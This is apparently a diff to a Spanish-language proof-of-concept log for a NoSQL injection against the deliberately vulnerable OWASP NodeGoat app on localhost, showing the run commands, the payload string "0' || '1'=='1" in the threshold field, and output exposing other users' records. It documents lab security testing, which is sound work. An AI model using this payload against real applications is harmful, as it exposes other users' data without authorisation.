@@ -3,15 +3,16 @@ Fecha: 2026-11-02
 App: OWASP NodeGoat, vulnerable/ en http://localhost:4000
 Categoria: OWASP A05:2025 Injection
 
-Comando:
+Comando (la clave demo se pasa por POC_PASS, no se publica):
   docker compose -f vulnerable/docker-compose.yml up -d --build
-  BASE=http://localhost:4000 python poc-scripts/v2_nosqli.py
+  BASE=http://localhost:4000 POC_PASS=<clave_demo> python3 poc-scripts/v2_nosqli.py
 
 Salida:
   [V2] Destino: http://localhost:4000  userId=1
   [V2] Payload threshold: "0' || '1'=='1"
   [V2] Linea base (threshold=0): 1 fila(s) -> ['Node Goat Admin']
-  [V2] Con inyeccion:            3 fila(s) -> ['John Doe', 'Node Goat Admin', 'Will Smith']
+  [V2] Con inyeccion:            HTTP 200, 3 fila(s) -> ['John Doe', 'Node Goat Admin', 'Will Smith']
+  [V2] Regresion (threshold=10): HTTP 200 (aceptado), 1 fila(s) propia(s)
   [V2] Datos expuestos de otros usuarios: ['John Doe', 'Will Smith']
   [V2] RESULTADO: VULNERABLE - el $where ejecuto la entrada (A05:2025)
   EXIT_ANTES=1
